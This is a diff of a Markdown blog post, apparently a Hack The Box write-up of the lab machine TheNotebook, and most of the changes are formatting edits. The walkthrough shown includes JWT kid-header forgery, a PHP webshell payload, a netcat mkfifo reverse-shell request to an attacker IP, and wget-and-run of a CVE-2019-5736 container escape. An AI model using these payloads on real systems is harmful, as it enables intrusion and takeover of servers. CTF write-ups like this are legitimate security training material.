@@ -19,8 +19,9 @@ Hello guys!
 
 This week's machine will be **TheNotebook**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [mostwanted002](https://app.hackthebox.eu/users/120514).
 
-\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups for Hack The Box machines are posted as soon as they're retired.
+</Alert>
 
 ![HTB TheNotebook](https://i.imgur.com/DSrrFJP.png)
 
@@ -31,7 +32,7 @@ This box was a very interesting one, where I had the opportunity to learn more a
 As usual, we start with a quick `nmap` scan to see which services are published in this box.
 
 ```bash
-$ nmap -sC -sV -Pn -oA quick 10.10.10.230                                                                                       
+$ nmap -sC -sV -Pn -oA quick 10.10.10.230
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 15:05 -03
 Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
@@ -61,7 +62,7 @@ Accessing the page, noticed that is a simple HTTP application, which uses the de
 
 ![HTB TheNotebook - 80/TCP](https://i.imgur.com/kJx4QaU.png)
 
-The guessing was confirmed during `whatweb` execution, which listed only the two known components, as well as the webserver it is running on which is an *Nginx*.
+The guessing was confirmed during `whatweb` execution, which listed only the two known components, as well as the webserver it is running on which is an _Nginx_.
 
 ```bash
 $ whatweb 10.10.10.230
@@ -99,7 +100,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 As I haven't found anything specific, decided to poke a little bit with this app, while inspecting the requests using Burp Suite, looking for an opportunity.
 
-Started by creating an account, clicking on the *Register* link where some basic information was requested as the image below, and resulted in the account creation without any further problem.
+Started by creating an account, clicking on the _Register_ link where some basic information was requested as the image below, and resulted in the account creation without any further problem.
 
 ![HTB TheNotebook - SignUp](https://i.imgur.com/e49Cij7.png)
 
@@ -128,8 +129,8 @@ Set-Cookie: uuid=796e6cc3-aa50-4f87-b74f-408146886c66; Path=/
 
 Checking its content at [jwt.ms](https://jwt.ms/), noticed some details that could allow us to elevate our privileges:
 
-* `kid` header, which defines the private key location in an HTTP Server running locally in the application server, is used to sign and evaluate the issued token.
-* `admin_cap` payload, which possibly contains a binary or integer that **represents the privilege/role** of the user, that for our recently created account is 0.
+- `kid` header, which defines the private key location in an HTTP Server running locally in the application server, is used to sign and evaluate the issued token.
+- `admin_cap` payload, which possibly contains a binary or integer that **represents the privilege/role** of the user, that for our recently created account is 0.
 
 ```json
 {
@@ -143,7 +144,7 @@ Checking its content at [jwt.ms](https://jwt.ms/), noticed some details that cou
 }.[Signature]
 ```
 
-The fact is: We cannot modify the issued token without signing it again with the key available in the server, but, once the token has a field pointing to the path to the key to which it was signed, we could get a chance to recreate this token, signing it with our own RSA key and **making it available to the backend** during our credential validation, but we can only be sure testing \:stuck\_out\_tongue\_winking\_eye:.
+The fact is: We cannot modify the issued token without signing it again with the key available in the server, but, once the token has a field pointing to the path to the key to which it was signed, we could get a chance to recreate this token, signing it with our own RSA key and **making it available to the backend** during our credential validation, but we can only be sure testing \:stuck_out_tongue_winking_eye:.
 
 ## Initial access
 
@@ -151,20 +152,20 @@ Once we need to create a token, searching for the easiest way to do it I have fo
 
 Achieved the desired outcome by running the following steps:
 
-* Created the RSA key using the command line below. We'll have as output the content of the public key and, in the specified file, the private key.
+- Created the RSA key using the command line below. We'll have as output the content of the public key and, in the specified file, the private key.
 
 ```bash
 openssl req -nodes -new -x509 -keyout privKey.key -noout -pubkey
 ```
 
-* Published the private key using a simple HTTP Server, using the same port web server was using in the observed token.
+- Published the private key using a simple HTTP Server, using the same port web server was using in the observed token.
 
 ```bash
 python3 -m http.server 7070
 ```
 
-* After creating the key, wrote a script as content below using the obtained values of public and private keys and signed the payload. This script uses examples located at [Usage Examples](https://pyjwt.readthedocs.io/en/stable/usage.html) in the official module documentation.
-  * Necessary to install the module using the command `pip3 install pyjwt`. In case `jwt` module is already installed, necessary to remove it first, otherwise, the script will fail.
+- After creating the key, wrote a script as content below using the obtained values of public and private keys and signed the payload. This script uses examples located at [Usage Examples](https://pyjwt.readthedocs.io/en/stable/usage.html) in the official module documentation.
+  - Necessary to install the module using the command `pip3 install pyjwt`. In case `jwt` module is already installed, necessary to remove it first, otherwise, the script will fail.
 
 ```python
 #!/usr/bin/python3
@@ -204,7 +205,7 @@ The generated token, according to jwt.ms, generated the payload below:
 }.[Signature]
 ```
 
-* As everything went as expected, is now time to change the cookie value in the browser and **:boom:**: a request was received in the python webserver by the backend, and we can now see the **Admin Panel** option while accessing the portal \:smile:
+- As everything went as expected, is now time to change the cookie value in the browser and **:boom:**: a request was received in the python webserver by the backend, and we can now see the **Admin Panel** option while accessing the portal \:smile:
 
 ```bash
 python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...10.10.10.230 - - [10/Jun/2021 18:45:24] "GET /privKey.key HTTP/1.1" 200 -
@@ -212,11 +213,11 @@ python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:707
 
 ![HTB TheNotebook - Admin Panel](https://i.imgur.com/NrGXJx9.png)
 
-* Analyzing what we can do next with the permissions we have from an administrator perspective, we can see two options: list existing notes and upload a file.
+- Analyzing what we can do next with the permissions we have from an administrator perspective, we can see two options: list existing notes and upload a file.
 
 ![HTB TheNotebook - Admin Options](https://i.imgur.com/fSYkzLZ.png)
 
-* Reviewing the content of existing notes, we were able to see all notes in the app, as the table below. Pay attention to the notes from **admin** which mentions an existing backup in the server as well as the **ability to execute PHP files in the server**:
+- Reviewing the content of existing notes, we were able to see all notes in the app, as the table below. Pay attention to the notes from **admin** which mentions an existing backup in the server as well as the **ability to execute PHP files in the server**:
 
 | Title                 | Note                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Owner |
 | --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----- |
@@ -227,15 +228,16 @@ python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:707
 
 Once we could possibly upload and run PHP files, decided to make a test, following the steps below:
 
-* Accessing the *File Upload* we have a simple page to post our files, where we're going to inspect the requests using burp.
+- Accessing the _File Upload_ we have a simple page to post our files, where we're going to inspect the requests using burp.
 
-  ![HTB TheNotebook - File Upload](https://i.imgur.com/fgI2wmr.png)
-  * Creating a simple webshell with the content `<?php system($_GET['cmd']);?>`, made its upload and didn't received any warning or block during the action.
-  * After uploading it, the file was listed on the page, and hitting the *View* butting, we were redirected to the path where the file was, allowing us to see the rendered content.
+![HTB TheNotebook - File Upload](https://i.imgur.com/fgI2wmr.png)
+
+- Creating a simple webshell with the content `<?php system($_GET['cmd']);?>`, made its upload and didn't received any warning or block during the action.
+- After uploading it, the file was listed on the page, and hitting the _View_ butting, we were redirected to the path where the file was, allowing us to see the rendered content.
   ![HTB TheNotebook - Uploaded Files](https://i.imgur.com/aCdIwnN.png)
-  * Adding a simple query string at its end, as expected by our simple web shell, to run the id command (`cmd=id`) and we could confirm that we have code execution in the server \:smiley:
+- Adding a simple query string at its end, as expected by our simple web shell, to run the id command (`cmd=id`) and we could confirm that we have code execution in the server \:smiley:
   ![HTB TheNotebook - Simple WebShell](https://i.imgur.com/eSH3rQY.png)
-  * To get a reverse shell, configured a listener and then sent another payload, this time to get a TCP connection from the server, which worked as expected \:smile:
+- To get a reverse shell, configured a listener and then sent another payload, this time to get a TCP connection from the server, which worked as expected \:smile:
 
 ```http
 GET /1e49f8a12603040cc99b2dd39f423b09.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.10.10+4443+>/tmp/f HTTP/1.1
@@ -253,10 +255,10 @@ Connection: close
 
 After obtaining the reverse shell, started enumerating the box with the account `www-data`, which is the one used by the web server execution. The following items stood out from the others listed during `linpeas.sh` execution:
 
-* Users with console and their permissions
-  * `noah:x:1000:1000:Noah:/home/noah:/bin/bash`
-  * `root:x:0:0:root:/root:/bin/bash`
-* Existence of `/var/backups` folder, also mentioned in the previously seen notes.
+- Users with console and their permissions
+  - `noah:x:1000:1000:Noah:/home/noah:/bin/bash`
+  - `root:x:0:0:root:/root:/bin/bash`
+- Existence of `/var/backups` folder, also mentioned in the previously seen notes.
 
 As this was previously mentioned, started by inspecting the contents of `/var/backups`, where most of the files we couldn't read except for the `home.tar.gz`, which could have some interesting information.
 
@@ -353,7 +355,7 @@ Checking the content of these files, in `create_db.py` noticed two password hash
     ]
 ```
 
-As haven't found anything in public sites (Crackstation, for example) this means that these passwords are not present in known wordlists like `rockyou.txt`, frequently used in CTFs. Decided to go further enumerating for other vulnerabilities in docker, specifically *docker breakout*, allowing us to escape to the host.
+As haven't found anything in public sites (Crackstation, for example) this means that these passwords are not present in known wordlists like `rockyou.txt`, frequently used in CTFs. Decided to go further enumerating for other vulnerabilities in docker, specifically _docker breakout_, allowing us to escape to the host.
 
 Searching for some information, found the repo [stealthcopter/deepce: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) (github.com)](https://github.com/stealthcopter/deepce) where there's a script that can help us enumerate the container characteristics known to be helpful in this kind of situation.
 
@@ -369,14 +371,14 @@ Searching for exploits I came across the repo [Frichetten/CVE-2019-5736-PoC: PoC
 
 To obtain the root shell, the following steps were executed, as also seen in this blog post ([Reproduction of docker escape vulnerability (CVE-2019-5736) - Programmer Sought](https://www.programmersought.com/article/71804432772/))
 
-* Downloaded and edited the script `escape.go` to give us a reverse shell.
-* Compiled it using the parameters below
+- Downloaded and edited the script `escape.go` to give us a reverse shell.
+- Compiled it using the parameters below
 
 ```bash
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build escape.go
 ```
 
-* Copied the exploit to the victim machine, inside the container, followed by its execution
+- Copied the exploit to the victim machine, inside the container, followed by its execution
 
 ```bash
 wget http://10.10.10.10/escape
@@ -384,7 +386,7 @@ chmod +x escape
 ./escape
 ```
 
-* Once the exploit replaces the file `/bin/sh` with the malicious script, execute the command line below to trigger the exploration
+- Once the exploit replaces the file `/bin/sh` with the malicious script, execute the command line below to trigger the exploration
 
 ```bash
 sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
